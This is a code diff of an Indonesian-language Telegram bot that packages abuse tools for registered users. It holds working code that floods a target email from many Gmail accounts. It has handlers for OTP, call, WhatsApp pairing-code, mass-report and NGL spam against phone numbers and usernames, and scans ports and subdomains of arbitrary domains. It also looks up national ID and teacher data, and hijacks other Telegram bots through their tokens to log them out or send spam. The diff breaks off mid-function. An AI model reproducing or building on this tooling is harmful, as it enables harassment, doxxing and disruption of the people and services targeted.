 def spam_gmail(target_email, custom_message):
     senders = get_email_senders()
     success_count = 0
-    
+
     if custom_message:
         subject = custom_message[:100]
         body = custom_message
@@ -6363,25 +6365,25 @@ Jika Anda tidak melakukan aktivitas ini, abaikan email ini.
 
 Terima kasih,
 Tim Keamanan."""
-    
+
     for sender in senders:
         try:
             msg = MIMEText(body)
             msg['Subject'] = subject
             msg['From'] = sender['email']
             msg['To'] = target_email
-            
+
             server = smtplib.SMTP('smtp.gmail.com', 587)
             server.starttls()
             server.login(sender['email'], sender['app_password'])
             server.sendmail(sender['email'], target_email, msg.as_string())
             server.quit()
-            
+
             success_count += 1
-            
+
         except Exception as e:
             continue
-    
+
     return success_count
 
 def run_spam_gmail(target_email, custom_message):
@@ -6439,7 +6441,7 @@ def tool_web_recon(domain):
                         subs.append(parts[0].strip())
         except:
             pass
-        
+
         ports = []
         common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 993, 995, 3306, 3389, 5432, 5900, 6379, 8080, 8443]
         for port in common_ports:
@@ -6452,7 +6454,7 @@ def tool_web_recon(domain):
                 sock.close()
             except:
                 pass
-        
+
         return {
             "domain": domain,
             "ip": ip,
@@ -6502,100 +6504,636 @@ def upload_to_catbox(file_path):
         return None
 
 class MikasaBot:
-   async def handle_document(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = str(update.effective_user.id)
-    state = context.user_data.get('state', '')
-    
-    if not self.is_verified(user_id):
-        await update.message.reply_text("❌ *Akses Ditolak!*")
-        return
-    
-    if state in ['upload_photo', 'upload_file']:
-        document = update.message.document or update.message.photo or update.message.video
-        
-        if not document:
-            await update.message.reply_text("❌ File tidak ditemukan!")
-            return
-        
-        file = await document.get_file()
-        file_size = file.file_size / (1024 * 1024)
-        
-        if file_size > 200 and state == 'upload_photo':
-            await update.message.reply_text("❌ File terlalu besar! Maksimal 200MB")
-            return
-        
-        if file_size > 10240 and state == 'upload_file':
-            await update.message.reply_text("❌ File terlalu besar! Maksimal 10GB")
-            return
-        
-        await update.message.reply_text(format_loading("Mengupload File"))
-        
-        try:
-            file_path = f"temp_{user_id}_{int(time.time())}"
-            await file.download_to_drive(file_path)
-            
-            url = upload_to_catbox(file_path)
-            os.remove(file_path)
-            
-            if url:
-                await update.message.reply_text(
-                    format_success(
-                        "𝐔𝐏𝐋𝐎𝐀𝐃 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋✅",
-                        f"📎 File: {document.file_name or 'file'}\n"
-                        f"📊 Size: {file_size:.2f} MB\n"
-                        f"🔗 URL: {url}"
-                    ),
-                    parse_mode=ParseMode.MARKDOWN
-                )
-            else:
-                await update.message.reply_text("❌ Gagal upload file!")
-            
-            context.user_data['state'] = ''
-            
-        except Exception as e:
-            await update.message.reply_text(format_error(str(e)))
-
-   def __init__(self, token):
+ def __init__(self, token):
         self.token = token
-        self.app = None
         self.users = load_users()
         self.user_data = {}
-        
-   async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        user_id = str(update.effective_user.id)
-        username = update.effective_user.username or "Unknown"
-        first_name = update.effective_user.first_name or "User"
-        
-        uid = get_uid()
-        status, user_data = cek_uid(uid)
-        
-        if status is None:
-            await update.message.reply_text(
-                f"❌ *Gagal terhubung ke server lisensi.*"
+
+ def send_text(self, chat_id, text, parse_mode=None):
+    url = f"https://api.telegram.org/bot{self.token}/sendMessage"
+    payload = {"chat_id": chat_id, "text": text}
+    if parse_mode:
+        payload["parse_mode"] = parse_mode
+    try:
+        requests.post(url, json=payload, timeout=10)
+    except:
+        pass
+
+ def start_sync(self, chat_id, user_id, first_name):
+    uid = get_uid()
+    status, user_data = cek_uid(uid)
+    
+    user_id = str(user_id)
+    if status is None:
+        self.send_text(chat_id, format_error("Gagal terhubung ke server lisensi."))
+        return
+    
+    if user_id in self.users:
+        user_data_local = self.users[user_id]
+        if user_data_local.get('status') == 'active':
+            self.send_welcome_sync(chat_id, first_name)
+            return
+        else:
+            self.send_text(chat_id, f"⏳ *Akun Belum Aktif*\n\n👤 Nama: {user_data_local.get('nama', 'User')}\n\nMenunggu verifikasi dari admin.")
+            return
+    
+    self.send_text(chat_id, f"🔐 *REGISTRASI DIPERLUKAN*\n\nGunakan: `/register nama_anda`\nContoh: `/register Yanto`")
+
+ def send_welcome_sync(self, chat_id, name):
+    keyboard = {
+        "inline_keyboard": [
+            [{"text": "〔 1 〕𝐒𝐏𝐀𝐌 𝐌𝐄𝐍𝐔", "callback_data": "menu_spam"}],
+            [{"text": "〔 2 〕𝐎𝐒𝐈𝐍𝐓 & 𝐓𝐀𝐑𝐂𝐊𝐄𝐑", "callback_data": "menu_osint"}],
+            [{"text": "〔 3 〕𝐔𝐓𝐈𝐋𝐈𝐓𝐘", "callback_data": "menu_utility"}],
+            [{"text": "〔 4 〕𝐌𝐄𝐍𝐔 𝐀𝐋𝐋", "callback_data": "menu_all"}],
+            [{"text": "〔 5 〕𝐂𝐋𝐎𝐒𝐄", "callback_data": "menu_close"}],
+        ]
+    }
+    caption = (
+        f"𝙈𝙄𝙆𝘼𝙎𝘼 𝘽𝙊𝙏 𝙈𝘿\n"
+        f"𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑: 𝐑𝐮𝐥𝐥𝐳𝐳𝐳𝟎𝟔\n\n"
+        f"𝙷𝚊𝚕𝚘 {name}! 𝙱𝚘𝚝 𝚒𝚗𝚒 𝚍𝚒 𝙱𝚞𝚊𝚝 𝙾𝚕𝚎𝚑\n"
+        f"𝐑𝐮𝐥𝐥𝐳𝐳𝐳𝟎𝟔, 𝙳𝚊𝚗 𝚂𝚒𝚕𝚊𝚑𝚔𝚊𝚗 𝙼𝚎𝚖𝚒𝚕𝚒𝚑 𝐊𝐚𝐭𝐞𝐠𝐨𝐫𝐲\n"
+        f"𝙳𝚒 𝙱𝚊𝚠𝚊𝚑 𝚒𝚗𝚒 😈👇"
+    )
+    self.send_photo(chat_id, BANNER_URL, caption, json.dumps(keyboard))
+
+ def register_sync(self, chat_id, user_id, nama):
+    user_id = str(user_id)
+    if user_id in self.users:
+        self.send_text(chat_id, f"⚠️ *Kamu sudah terdaftar!*\n\nStatus: {'Aktif' if self.users[user_id].get('status') == 'active' else 'Pending'}")
+        return
+    
+    uid = get_uid()
+    self.users[user_id] = {
+        "id": user_id,
+        "nama": nama,
+        "uid": uid,
+        "status": "pending",
+        "registered_at": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    }
+    save_users(self.users)
+    
+    self.notify_admin_sync(
+        f"🔑 *REGISTRASI USER BARU*\n\n"
+        f"🆔 User ID: `{user_id}`\n"
+        f"👤 Nama: {nama}\n"
+        f"🆔 UID: `{uid}`\n"
+        f"🕐 Waktu: {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}\n\n"
+        f"Verifikasi: `/verify {user_id}`"
+    )
+    
+    self.send_text(chat_id, f"✅ *Registrasi Berhasil!*\n\n👤 Nama: {nama}\n⏳ Menunggu Verifikasi Admin")
+
+ def verify_sync(self, chat_id, user_id, target_id):
+    user_id = str(user_id)
+    if int(user_id) != ADMIN_ID:
+        self.send_text(chat_id, "❌ *Akses Ditolak!* Hanya admin.")
+        return
+    
+    if target_id not in self.users:
+        self.send_text(chat_id, f"❌ User ID `{target_id}` tidak ditemukan!")
+        return
+    
+    self.users[target_id]['status'] = 'active'
+    save_users(self.users)
+    self.send_text(chat_id, format_success("VERIFIKASI BERHASIL✅", f"🆔 ID: `{target_id}`\n👤 Nama: {self.users[target_id].get('nama', 'Unknown')}"))
+    
+    try:
+        requests.post(f"https://api.telegram.org/bot{self.token}/sendMessage", 
+                     json={"chat_id": int(target_id), "text": "✅ *Akun Diverifikasi!*\n\nGunakan /start untuk memulai."}, timeout=10)
+    except:
+        pass
+
+ def spam_otp_sync(self, chat_id, nomor):
+    if nomor.startswith('0'):
+        nomor = nomor
+    elif nomor.startswith('62'):
+        nomor = '0' + nomor[2:]
+    elif nomor.startswith('+62'):
+        nomor = '0' + nomor[3:]
+    
+    self.send_text(chat_id, format_loading("Mengirim Spam OTP"))
+    
+    results = run_spam_otp(nomor)
+    success = sum(1 for r in results if '✅' in r)
+    failed = len(results) - success
+    
+    detail = "\n".join(results[:20])
+    if len(results) > 20:
+        detail += f"\n... dan {len(results)-20} lainnya"
+    
+    msg = format_success(
+        "𝐒𝐏𝐀𝐌 𝐎𝐓𝐏 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+        f"📱 Target: `{nomor}`\n"
+        f"✅ Berhasil: {success}\n"
+        f"❌ Gagal: {failed}\n"
+        f"📋 Total API: {len(results)}\n\n"
+        f"{detail}"
+    )
+    self.send_text(chat_id, msg, "Markdown")
+
+ def spam_call_sync(self, chat_id, nomor):
+    self.send_text(chat_id, format_loading("Mengirim Spam Call"))
+    success = run_spam_call(nomor)
+    msg = format_success(
+        "𝐒𝐏𝐀𝐌 𝐂𝐀𝐋𝐋 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+        f"📱 Target: `{nomor}`\n✅ Berhasil: {success}/10"
+    )
+    self.send_text(chat_id, msg, "Markdown")
+
+ def spam_pair_sync(self, chat_id, nomor):
+    if nomor.startswith('0'):
+        nomor = '62' + nomor[1:]
+    elif nomor.startswith('+62'):
+        nomor = nomor[1:]
+    self.send_text(chat_id, format_loading("Mengirim Kode Pairing"))
+    success = run_spam_pairing(nomor)
+    msg = format_success(
+        "𝐒𝐏𝐀𝐌 𝐏𝐀𝐈𝐑𝐈𝐍𝐆 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+        f"📱 Target: `{nomor}`\n✅ Berhasil: {success}/5"
+    )
+    self.send_text(chat_id, msg, "Markdown")
+
+ def spam_repwa_sync(self, chat_id, nomor):
+    self.send_text(chat_id, format_loading("Mengirim Spam Report"))
+    results = run_spam_report(nomor)
+    detail = "\n".join(results)
+    msg = format_success(
+        "𝐒𝐏𝐀𝐌 𝐑𝐄𝐏𝐎𝐑𝐓 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+        f"📱 Target: `{nomor}`\n\n📋 Detail:\n{detail}"
+    )
+    self.send_text(chat_id, msg, "Markdown")
+
+ def spam_ngl_sync(self, chat_id, username):
+    self.send_text(chat_id, format_loading("Mengirim Spam NGL"))
+    success = run_spam_ngl(username)
+    msg = format_success(
+        "𝐒𝐏𝐀𝐌 𝐍𝐆𝐋 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+        f"👤 Target: `{username}`\n✅ Berhasil: {success}/20"
+    )
+    self.send_text(chat_id, msg, "Markdown")
+
+ def spam_gmail_sync(self, chat_id, target_email, custom_message=None):
+    if not re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', target_email):
+        self.send_text(chat_id, "❌ Format email tidak valid!")
+        return
+    
+    self.send_text(chat_id, format_loading(f"Mengirim Spam Email ke {target_email}"))
+    success, total = run_spam_gmail(target_email, custom_message)
+    msg = format_success(
+        "𝐒𝐏𝐀𝐌 𝐄𝐌𝐀𝐈𝐋 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+        f"📧 Target: `{target_email}`\n✅ Berhasil: {success}/{total} sender"
+    )
+    self.send_text(chat_id, msg, "Markdown")
+
+ def osint_nomor_sync(self, chat_id, nomor):
+    self.send_text(chat_id, format_loading("Melakukan OSINT Nomor"))
+    info = osint_nomor(nomor)
+    if info:
+        msg = format_success(
+            "𝐎𝐒𝐈𝐍𝐓 𝐍𝐎𝐌𝐎𝐑 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+            f"📱 Nomor: `{info['nomor']}`\n"
+            f"✅ Valid: {info['valid']}\n"
+            f"📍 Negara: {info['negara']}\n"
+            f"📱 Operator: {info['operator']}\n"
+            f"🌐 Timezone: {info['timezone']}"
+        )
+        self.send_text(chat_id, msg, "Markdown")
+    else:
+        self.send_text(chat_id, "❌ Gagal OSINT")
+
+ def osint_username_sync(self, chat_id, username):
+    self.send_text(chat_id, format_loading("Melakukan OSINT Username"))
+    found = osint_username(username)
+    if found:
+        msg = f"𝙊𝙎𝙄𝙉𝙏 𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀 𝙎𝙀𝙇𝙀𝙎𝘼𝙄✅\n\n"
+        for name, url in found[:20]:
+            msg += f"✅ {name}: {url}\n"
+        self.send_text(chat_id, msg)
+    else:
+        self.send_text(chat_id, f"❌ Username `{username}` tidak ditemukan", "Markdown")
+
+ def osint_ip_sync(self, chat_id, ip):
+    self.send_text(chat_id, format_loading("Melakukan OSINT IP"))
+    data = osint_ip(ip)
+    if data and data.get('status') == 'success':
+        msg = format_success(
+            "𝐎𝐒𝐈𝐍𝐓 𝐈𝐏 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+            f"🌍 IP: `{data.get('query')}`\n"
+            f"📍 Negara: {data.get('country')}\n"
+            f"🏙️ Kota: {data.get('city')}\n"
+            f"📌 ISP: {data.get('isp')}\n"
+            f"🌐 Timezone: {data.get('timezone')}\n"
+            f"🗺️ Google Maps: https://maps.google.com/?q={data.get('lat')},{data.get('lon')}"
+        )
+        self.send_text(chat_id, msg, "Markdown")
+    else:
+        self.send_text(chat_id, "❌ Gagal OSINT IP")
+
+ def osint_domain_sync(self, chat_id, domain):
+    self.send_text(chat_id, format_loading("Melakukan OSINT Domain"))
+    data = osint_domain(domain)
+    if data:
+        whois = data.get('whois', {})
+        msg = format_success(
+            "𝐎𝐒𝐈𝐍𝐓 𝐃𝐎𝐌𝐀𝐈𝐍 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+            f"🌍 Domain: `{data['domain']}`\n"
+            f"📌 IP: `{data['ip']}`\n"
+            f"📋 Registrar: {whois.get('registrar', 'N/A')}\n"
+            f"📅 Created: {whois.get('creation_date', 'N/A')}\n"
+            f"⏰ Expires: {whois.get('expiration_date', 'N/A')}"
+        )
+        self.send_text(chat_id, msg, "Markdown")
+    else:
+        self.send_text(chat_id, f"❌ Domain `{domain}` tidak ditemukan", "Markdown")
+
+ def ip_tracker_sync(self, chat_id, ip):
+    self.send_text(chat_id, format_loading("Melacak IP"))
+    data = tool_ip_tracker(ip)
+    if data and data.get('status') == 'success':
+        msg = format_success(
+            "𝐈𝐏 𝐓𝐑𝐀𝐂𝐊𝐄𝐑 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+            f"━━━ *INFORMASI IP* ━━━\n"
+            f"🌍 IP: `{data.get('query')}`\n"
+            f"📍 Negara: {data.get('country')} ({data.get('countryCode')})\n"
+            f"🗺️ Region: {data.get('regionName')}\n"
+            f"🏙️ Kota: {data.get('city')}\n"
+            f"📮 Kode Pos: {data.get('zip')}\n"
+            f"📌 ISP: {data.get('isp')}\n"
+            f"🏢 Organisasi: {data.get('org')}\n"
+            f"🌐 Timezone: {data.get('timezone')}\n"
+            f"📱 Mobile: {'Ya' if data.get('mobile') else 'Tidak'}\n"
+            f"🔒 Proxy/VPN: {'Ya' if data.get('proxy') else 'Tidak'}\n"
+            f"🗺️ Google Maps: https://maps.google.com/?q={data.get('lat')},{data.get('lon')}"
+        )
+        self.send_text(chat_id, msg, "Markdown")
+    else:
+        self.send_text(chat_id, "❌ Gagal melacak IP")
+
+ def port_scan_sync(self, chat_id, domain):
+    domain = domain.replace('http://', '').replace('https://', '').replace('www.', '').split('/')[0]
+    self.send_text(chat_id, format_loading("Scanning Port"))
+    result = tool_port_scanner(domain)
+    if result:
+        if result['open_ports']:
+            ports_text = "\n".join([f"🔓 {p['port']} ({p['name']})" for p in result['open_ports']])
+            msg = format_success(
+                "𝐏𝐎𝐑𝐓 𝐒𝐂𝐀𝐍 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+                f"🌍 Target: `{domain}`\n"
+                f"📌 IP: `{result['ip']}`\n"
+                f"🔓 Port terbuka:\n{ports_text}"
+            )
+            self.send_text(chat_id, msg, "Markdown")
+        else:
+            msg = format_success(
+                "𝐏𝐎𝐑𝐓 𝐒𝐂𝐀𝐍 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+                f"🌍 Target: `{domain}`\n"
+                f"📌 IP: `{result['ip']}`\n"
+                f"❌ Tidak ada port terbuka"
+            )
+            self.send_text(chat_id, msg, "Markdown")
+    else:
+        self.send_text(chat_id, "❌ Gagal scan port")
+
+ def nik_parse_sync(self, chat_id, nik):
+    if not nik.isdigit() or len(nik) != 16:
+        self.send_text(chat_id, "❌ NIK harus 16 digit angka!")
+        return
+    self.send_text(chat_id, format_loading("Mengecek NIK"))
+    try:
+        url = f"https://api.nexray.eu.cc/tools/nikparse?nik={nik}"
+        resp = requests.get(url, timeout=10)
+        if resp.status_code == 200:
+            data = resp.json()
+            result = data.get('result', {})
+            msg = format_success(
+                "𝐍𝐈𝐊 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+                f"📌 NIK: `{nik}`\n"
+                f"👤 Gender: {result.get('kelamin', 'N/A')}\n"
+                f"📅 Lahir: {result.get('lahir_lengkap', 'N/A')}\n"
+                f"📍 Provinsi: {result.get('provinsi', {}).get('nama', 'N/A')}\n"
+                f"🏙️ Kab/Kota: {result.get('kotakab', {}).get('nama', 'N/A')}\n"
+                f"📌 Kecamatan: {result.get('kecamatan', {}).get('nama', 'N/A')}"
+            )
+            self.send_text(chat_id, msg, "Markdown")
+        else:
+            self.send_text(chat_id, f"❌ NIK `{nik}` tidak ditemukan", "Markdown")
+    except:
+        self.send_text(chat_id, "❌ Gagal cek NIK")
+
+ def cek_kodepos_sync(self, chat_id, kode_pos):
+    if not kode_pos.isdigit() or len(kode_pos) != 5:
+        self.send_text(chat_id, "❌ Kode pos harus 5 digit!")
+        return
+    self.send_text(chat_id, format_loading("Mencari Kode Pos"))
+    data = tool_cek_kode_pos(kode_pos)
+    if data:
+        msg = format_success(
+            "𝐊𝐎𝐃𝐄 𝐏𝐎𝐒 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+            f"📮 Kode Pos: `{kode_pos}`\n📍 Nama: {data.get('nama', 'N/A')}"
+        )
+        self.send_text(chat_id, msg, "Markdown")
+    else:
+        self.send_text(chat_id, f"❌ Kode pos `{kode_pos}` tidak ditemukan", "Markdown")
+
+ def cek_npsn_sync(self, chat_id, npsn):
+    if not npsn.isdigit() or len(npsn) != 8:
+        self.send_text(chat_id, "❌ NPSN harus 8 digit!")
+        return
+    self.send_text(chat_id, format_loading("Mencari NPSN"))
+    data = tool_cek_npsn(npsn)
+    if data:
+        msg = format_success(
+            "𝐍𝐏𝐒𝐍 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+            f"🏫 Nama: {data.get('nama', 'N/A')}\n"
+            f"📮 NPSN: {data.get('npsn', 'N/A')}\n"
+            f"📍 Provinsi: {data.get('provinsi', 'N/A')}\n"
+            f"🏙️ Kab/Kota: {data.get('kabupaten', 'N/A')}"
+        )
+        self.send_text(chat_id, msg, "Markdown")
+    else:
+        self.send_text(chat_id, f"❌ NPSN `{npsn}` tidak ditemukan", "Markdown")
+
+ def ff_uid_sync(self, chat_id, uid):
+    if not uid.isdigit():
+        self.send_text(chat_id, "❌ UID harus angka!")
+        return
+    self.send_text(chat_id, format_loading("Mengecek UID Free Fire"))
+    data = tool_freefire_checker(uid)
+    if data:
+        msg = format_success(
+            "𝐅𝐑𝐄𝐄 𝐅𝐈𝐑𝐄 𝐔𝐈𝐃 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+            f"🆔 UID: `{data.get('uid', 'N/A')}`\n"
+            f"👤 Nama: {data.get('name', 'N/A')}\n"
+            f"📊 Level: {data.get('level', 'N/A')}\n"
+            f"🌍 Region: {data.get('region', 'N/A')}"
+        )
+        self.send_text(chat_id, msg, "Markdown")
+    else:
+        self.send_text(chat_id, f"❌ UID `{uid}` tidak ditemukan", "Markdown")
+
+ def cek_roblox_sync(self, chat_id, username):
+    self.send_text(chat_id, format_loading("Mengecek Akun Roblox"))
+    data = tool_roblox_checker(username)
+    if data:
+        basic = data.get('basic', {})
+        msg = format_success(
+            "𝐑𝐎𝐁𝐋𝐎𝐗 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+            f"🆔 ID: `{data.get('userId', 'N/A')}`\n"
+            f"👤 Username: {basic.get('name', 'N/A')}\n"
+            f"📅 Created: {basic.get('created', 'N/A')}"
+        )
+        self.send_text(chat_id, msg, "Markdown")
+    else:
+        self.send_text(chat_id, f"❌ Username `{username}` tidak ditemukan", "Markdown")
+
+ def cek_dataguru_sync(self, chat_id, keyword):
+    self.send_text(chat_id, format_loading("Mencari Data Guru"))
+    data = tool_cek_gtk(keyword)
+    if data:
+        msg = format_success(
+            "𝐃𝐀𝐓𝐀 𝐆𝐔𝐑𝐔 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+            f"👤 Nama: {data.get('nama', 'N/A')}\n"
+            f"📮 NUPTK: {data.get('nuptk', 'N/A')}\n"
+            f"🏫 Sekolah: {data.get('sekolah', {}).get('nama', 'N/A')}\n"
+            f"📍 Provinsi: {data.get('sekolah', {}).get('m_propinsi', {}).get('keterangan', 'N/A')}"
+        )
+        self.send_text(chat_id, msg, "Markdown")
+    else:
+        self.send_text(chat_id, f"❌ Data tidak ditemukan untuk `{keyword}`", "Markdown")
+
+ def cek_imei_sync(self, chat_id, imei):
+    if not imei.isdigit() or len(imei) < 14 or len(imei) > 17:
+        self.send_text(chat_id, "❌ IMEI harus 14-17 digit!")
+        return
+    self.send_text(chat_id, format_loading("Mengecek IMEI"))
+    data = tool_cek_imei(imei)
+    if data:
+        msg = format_success(
+            "𝐈𝐌𝐄𝐈 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+            f"📌 IMEI: `{imei}`\n"
+            f"📱 Model: {data.get('Item1', 'N/A')}\n"
+            f"🏷️ Brand: {data.get('Item3', 'N/A')}"
+        )
+        self.send_text(chat_id, msg, "Markdown")
+    else:
+        self.send_text(chat_id, f"❌ IMEI `{imei}` tidak ditemukan", "Markdown")
+
+ def cek_phising_sync(self, chat_id, url):
+    if not url.startswith('http'):
+        url = 'https://' + url
+    self.send_text(chat_id, format_loading("Mengecek URL Phising"))
+    data = tool_web_phising_checker(url)
+    if data:
+        status = "⚠️ Terdeteksi PHISING!" if data.get('is_phishing') else "✅ Aman"
+        msg = format_success(
+            "𝐂𝐄𝐊 𝐋𝐈𝐍𝐊 𝐏𝐇𝐈𝐒𝐈𝐍𝐆 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+            f"🔗 URL: {url[:60]}...\n"
+            f"📌 Status: {status}\n"
+            f"🛡️ Malware: {'⚠️ Terdeteksi' if data.get('contains_malware') else '✅ Aman'}"
+        )
+        self.send_text(chat_id, msg, "Markdown")
+    else:
+        self.send_text(chat_id, "❌ Gagal mengecek URL")
+
+ def web_recon_sync(self, chat_id, domain):
+    domain = domain.replace('http://', '').replace('https://', '').replace('www.', '').split('/')[0]
+    self.send_text(chat_id, format_loading("Melakukan Web Reconnaissance"))
+    data = tool_web_recon(domain)
+    if data:
+        msg = format_success(
+            "𝐖𝐄𝐁 𝐑𝐄𝐂𝐎𝐍 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+            f"🌍 Domain: `{data['domain']}`\n"
+            f"📌 IP: `{data['ip']}`\n"
+            f"🔍 Subdomain: {data['total_subs']} ditemukan\n"
+            f"🔌 Port terbuka: {', '.join(map(str, data['open_ports'])) if data['open_ports'] else 'Tidak ada'}\n\n"
+            f"📋 *Subdomain sample:*\n" + "\n".join(data['subdomains'][:10]) if data['subdomains'] else "Tidak ada subdomain"
+        )
+        self.send_text(chat_id, msg, "Markdown")
+    else:
+        self.send_text(chat_id, f"❌ Gagal reconnaissance untuk `{domain}`", "Markdown")
+
+ def shortener_url_sync(self, chat_id, url):
+    if not url.startswith('http'):
+        url = 'https://' + url
+    self.send_text(chat_id, format_loading("Memendekkan URL"))
+    result = tool_link_shortener(url)
+    if result:
+        msg = format_success(
+            "𝐋𝐈𝐍𝐊 𝐒𝐇𝐎𝐑𝐓𝐄𝐍𝐄𝐑 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+            f"🔗 URL Pendek: {result}\n📎 URL Asli: {url[:60]}..."
+        )
+        self.send_text(chat_id, msg, "Markdown")
+    else:
+        self.send_text(chat_id, "❌ Gagal memendekkan URL")
+
+ def cek_resi_sync(self, chat_id, courier, awb):
+    if not awb:
+        self.send_text(chat_id, "❌ Format: /cekresi kurir nomorresi")
+        return
+    self.send_text(chat_id, format_loading("Mencari Resi"))
+    data = tool_cek_resi(courier.lower(), awb)
+    if data:
+        history = data.get('history', [])
+        history_text = ""
+        for h in history[-5:]:
+            history_text += f"📅 {h.get('date', '')} → {h.get('desc', '')}\n"
+        msg = format_success(
+            "𝐂𝐄𝐊 𝐑𝐄𝐒𝐈 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+            f"📮 Resi: `{data.get('awb')}`\n"
+            f"📦 Kurir: {data.get('courier', '').upper()}\n"
+            f"📌 Status: {data.get('status')}\n\n"
+            f"📋 *Riwayat:*\n{history_text or 'Belum ada riwayat'}"
+        )
+        self.send_text(chat_id, msg, "Markdown")
+    else:
+        self.send_text(chat_id, f"❌ Resi `{awb}` tidak ditemukan", "Markdown")
+
+ def lapor_bug_sync(self, chat_id):
+    self.send_text(chat_id, "𝙇𝙖𝙥𝙤𝙧𝙠𝙖𝙣 𝙗𝙪𝙜 𝙠𝙚 𝙖𝙙𝙢𝙞𝙣:\nhttps://wa.me/+6283832110509")
+
+ def foto_tourl_sync(self, chat_id):
+    self.send_text(chat_id, "Kirim file foto/video (max 200MB)")
+
+ def file_tourl_sync(self, chat_id):
+    self.send_text(chat_id, "Kirim file (max 10GB)")
+
+ def hack_status_wa_sync(self, chat_id):
+    self.send_text(chat_id, "HACK STATUS WA\nPastikan WhatsApp terinstall dan sudah membuka status.\nHasil akan disimpan di folder Status_WA")
+
+ def kill_bottele_sync(self, chat_id, token):
+    self.send_text(chat_id, format_loading("Membunuh Bot Telegram"))
+    try:
+        url = f'https://api.telegram.org/bot{token}/logOut'
+        resp = requests.get(url, timeout=10)
+        if resp.status_code == 200:
+            data = resp.json()
+            if data.get('ok'):
+                self.send_text(chat_id, format_success("𝐊𝐈𝐋𝐋 𝐁𝐎𝐓 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅", "✅ Bot berhasil dimatikan!"))
+            else:
+                self.send_text(chat_id, "❌ Token bot tidak valid")
+        else:
+            self.send_text(chat_id, "❌ Gagal mematikan bot")
+    except:
+        self.send_text(chat_id, "❌ Error")
+
+ def cek_infobot_sync(self, chat_id, token):
+    self.send_text(chat_id, format_loading("Mengambil Info Bot"))
+    try:
+        url = f'https://api.telegram.org/bot{token}/getMe'
+        resp = requests.get(url, timeout=10)
+        if resp.status_code == 200:
+            data = resp.json()
+            if data.get('ok'):
+                result = data.get('result', {})
+                msg = format_success(
+                    "𝐈𝐍𝐅𝐎 𝐁𝐎𝐓 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+                    f"🆔 ID: `{result.get('id')}`\n"
+                    f"👤 Nama: {result.get('first_name')}\n"
+                    f"🔗 Username: @{result.get('username')}"
+                )
+                self.send_text(chat_id, msg, "Markdown")
+            else:
+                self.send_text(chat_id, "❌ Token bot tidak valid")
+        else:
+            self.send_text(chat_id, "❌ Gagal mengambil info bot")
+    except:
+        self.send_text(chat_id, "❌ Error")
+
+ def get_id_chat_sync(self, chat_id, token):
+    self.send_text(chat_id, format_loading("Mengambil ID Chat Bot"))
+    try:
+        url = f'https://api.telegram.org/bot{token}/getMe'
+        resp = requests.get(url, timeout=10)
+        if resp.status_code == 200:
+            data = resp.json()
+            if data.get('ok'):
+                result = data.get('result', {})
+                msg = format_success(
+                    "𝐆𝐄𝐓 𝐈𝐃 𝐂𝐇𝐀𝐓 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+                    f"🆔 Bot ID: `{result.get('id')}`\n"
+                    f"👤 Nama: {result.get('first_name')}\n"
+                    f"🔗 Username: @{result.get('username')}"
+                )
+                self.send_text(chat_id, msg, "Markdown")
+            else:
+                self.send_text(chat_id, "❌ Token bot tidak valid")
+        else:
+            self.send_text(chat_id, "❌ Gagal mengambil ID bot")
+    except:
+        self.send_text(chat_id, "❌ Error")
+
+ def spam_bottele_sync(self, chat_id, token, chat_id_target, pesan):
+    self.send_text(chat_id, format_loading("Mengirim Spam Bot Telegram"))
+    success = 0
+    for i in range(10):
+        url = f"https://api.telegram.org/bot{token}/sendMessage"
+        try:
+            resp = requests.post(url, json={"chat_id": chat_id_target, "text": pesan}, timeout=10)
+            if resp.status_code == 200:
+                success += 1
+        except:
+            pass
+        time.sleep(0.5)
+    msg = format_success(
+        "𝐒𝐏𝐀𝐌 𝐁𝐎𝐓 𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+        f"✅ Berhasil: {success}/10\n📌 Chat ID: `{chat_id_target}`"
+    )
+    self.send_text(chat_id, msg, "Markdown")
+
+ def notify_admin_sync(self, message, parse_mode="Markdown"):
+    try:
+        url = f"https://api.telegram.org/bot{self.token}/sendMessage"
+        payload = {"chat_id": ADMIN_ID, "text": message, "parse_mode": parse_mode}
+        requests.post(url, json=payload, timeout=10)
+    except:
+        pass
+
+ def osint_sync(self, chat_id):
